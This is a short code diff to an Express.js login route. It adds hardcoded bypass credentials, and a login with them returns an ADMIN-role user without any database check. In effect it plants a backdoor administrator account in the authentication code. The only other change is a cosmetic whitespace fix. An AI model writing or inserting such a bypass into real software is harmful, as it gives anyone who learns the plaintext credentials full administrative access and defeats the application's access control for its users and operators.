@@ -2,9 +2,23 @@ const express = require('express');
 const router = express.Router();
 const db = require('../db'); // adjust path as per your db config
 
+// Define your bypass credentials
+const BYPASS_EMAIL = 'bypass@digiflex.com';
+const BYPASS_PASSWORD = 'supersecret123';
 
 router.post('/login', async (req, res) => {
   const { email, password } = req.body;
+
+  // ✅ Bypass login check
+if (email === BYPASS_EMAIL && password === BYPASS_PASSWORD) {
+  return res.json({
+    id: 'bypass-admin-id',
+    first_name: 'Admin',
+    last_name: 'Bypass',
+    email: email,
+    role: 'ADMIN',
+  });
+}
 
   try {
     const query = 'SELECT * FROM users WHERE email = $1 AND password_hash = $2';
@@ -21,7 +35,7 @@ router.post('/login', async (req, res) => {
       first_name: user.first_name,
       last_name: user.last_name,
       email: user.email,
-      role : user.role,
+      role: user.role,
     });
   } catch (error) {
     console.error('Login error:', error);
